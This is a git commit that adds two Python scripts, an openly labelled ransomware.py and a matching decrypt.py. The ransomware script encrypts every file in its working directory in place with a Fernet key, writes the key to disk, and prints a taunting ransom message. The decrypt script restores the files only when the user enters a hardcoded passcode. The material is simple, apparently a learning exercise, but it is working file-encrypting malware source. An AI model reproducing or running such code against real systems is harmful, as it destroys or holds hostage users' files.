aa32f36ac5c7a508a3933abd072d52a2814c459d
Ayoub0x1 <ayoub0x1@wearehackerone.com>
2022-05-16 19:57:16 +0000

    final code

---
+++ decrypt.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+files = []                              #create our list
+
+for file in os.listdir():               #list file in .
+    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":         # do not list this file
+        continue
+    if os.path.isfile(file):            #onlu files
+        files.append(file)              # append them to the list
+print(files)
+
+
+with open("thekey.key", "rb") as key:
+    secretkey = key.read()
+
+secretphrase = "5609"
+
+user_phrase = input("Enter the secret passcode to decrypt your files :)\n")
+
+if user_phrase == secretphrase:
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_decrypted = Fernet(secretkey).decrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_decrypted)
+        print("Congrats, your files are decrypted. Enjoy\n")
+else:
+    print("Wrong passcode :(\n")
---
+++ ransomware.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+files = []                              #create our list
+
+for file in os.listdir():               #list file in .
+    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":         # do not list this file
+        continue
+    if os.path.isfile(file):            #onlu files
+        files.append(file)              # append them to the list
+print(files)
+
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+
+    thekey.write(key)
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
+
+print("ALL your files have been encrypted! beg me to save you :)")
